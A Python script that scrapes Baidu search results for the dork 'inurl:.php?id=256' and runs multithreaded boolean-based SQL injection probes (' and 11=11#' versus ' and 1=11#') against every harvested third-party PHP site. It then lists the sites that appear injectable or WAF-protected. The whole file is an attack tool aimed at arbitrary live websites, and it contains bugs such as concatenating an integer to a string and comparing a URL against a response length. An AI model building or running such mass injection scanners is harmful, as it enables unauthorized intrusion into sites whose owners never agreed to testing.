#coding:utf-8
#get href
from bs4 import BeautifulSoup
from queue import Queue
import threading
import requests

'''
wd 关键词
page 页数
返回 html源代码
'''
q = Queue()
sql = set()
waf = set()
host = []
def getHtml(wd,page):
	html = ''
	header = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0'
	}
	print('[+]Collect Page '+str(page)+' Url...')
	url = "https://www.baidu.com/s?wd={0}&pn={1}".format(wd,page*10)
	html += requests.get(url,headers=header).text
	return html

'''
html html源代码
返回href 数组
'''
def html2href(html):
	url = set()
	html = BeautifulSoup(html,'lxml')
	for i in html.find_all('a'):
		try:
			a = requests.get(i.get('href'),timeout=0.5).url
			#根据情况更改
			if "php" in a and "baidu" not in a:
				h = a[:a.find('/',8)]
				if h in host:
					continue
				host.append(h)
				url.add(a)
		except:
			continue
	for i in url:
		q.put(i)
	print('[*]Collect Finished.')

def search(wd,page):
	a = getHtml(wd,page)
	b = html2href(a)
	print('[+]Start Scan...')


'''
进行注入测试
'''
def scan():
	while not q.empty():
		url = q.get()
		print('[+]Scan '+url)
		try:
			#分割参数
			prase = url.split('php?')[1]
			params = prase.split('&')
			origin = len(requests.get(url,timeout=1).text)
		except:
			continue
		payload = {
			'true':'%20and%2011=11%23',
			'false':'%20and%201=11%23'
		}

		for i in params:
			try:
				a = url.replace(i,i+payload['true'])
				b = url.replace(i,i+payload['false'])
				sql_true = len(requests.get(a,timeout=1).text)
				sql_false = len(requests.get(b,timeout=1).text)
			except:
				continue
			if  sql_false != origin:
				if sql_true == origin:
					print('[*]Find Sql Injection!! '+url)
					sql.add(url)
				else:
					c = url.replace(i,i+'a')
					now = len(requests.get(c,timeout=1).text)
					if c != origin:
						print('[-]May Waf Is Active!! '+url)
						waf.add(url)



def main():
	for i in range(1,5):
		search('inurl:.php?id=256',i)
		for i in range(10):
			t = threading.Thread(target=scan)
			t.start()
	print("[*]Scan End!!!")
	print("[*]Find "+len(sql))
	for i in sql:
		print('[!]'+i)
	print("[-]Waf May Be Active "+len(waf))
	for i in waf:
		print('[!]'+i)


if __name__ == '__main__':
	main()
